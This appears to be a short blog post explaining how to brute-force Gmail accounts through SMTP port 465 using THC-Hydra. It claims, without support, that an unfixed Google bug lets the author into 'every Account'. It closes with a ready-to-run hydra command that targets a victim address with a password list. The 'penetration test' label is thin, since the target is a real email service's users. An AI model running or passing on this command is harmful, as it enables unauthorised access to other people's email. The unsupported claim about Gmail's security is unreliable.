Brute Force Attacks!

via smtp port 465 - gmail

I'm wundering about every bug, but, no idea, why Google is not fix the Bug. For me as Web Developer was simple to going into my Account. I mean, every Account! But i want to let you know these are Penetration Test and Playing arounf with THC - HYDRA.

i have written a New CommandLine which Brute Force The Gmail Port 465 via. Mac Os X or Linux. Of course you have write a passlist.txt file and but in to your Root of your Mac. - and open Terminal and start hydra.


Hydra Commandline by Lucas Gatsas - for Brute Force Attack on Mac Os X
hydra -S -l victim@gmail.com -P /users/yourmac/passlist.txt -e ns -V -s 465 smtp.gmail.com smtp
